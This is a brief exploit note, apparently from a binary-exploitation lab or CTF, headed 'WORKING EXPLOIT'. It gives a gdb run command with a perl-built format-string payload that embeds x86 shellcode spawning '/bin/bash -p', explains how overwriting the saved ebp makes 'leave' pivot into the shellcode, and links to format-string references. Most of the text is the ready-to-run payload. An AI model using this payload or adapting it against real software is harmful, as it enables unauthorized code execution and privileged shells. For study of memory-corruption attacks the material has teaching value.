-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
WORKING EXPLOIT
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

run $(perl -e 'print "\x88\x98\x04\x08"x2 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "%134518871u%10\$n"')

This will overwrite the address of the previous ebp with the buf address, now when at the end of the main is executed the instruction 'leave', the content of ebp will be pushed
into esp, it will finally restore a malicious address injected together with the shellcode and it will jump into the shellcode.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



----------------------------------------------------------
GREAT RESOURCE

http://repo.hackerzvoice.net/depot_ouah/formatPaper.txt

http://phrack.org/issues/55/8.html

----------------------------------------------------------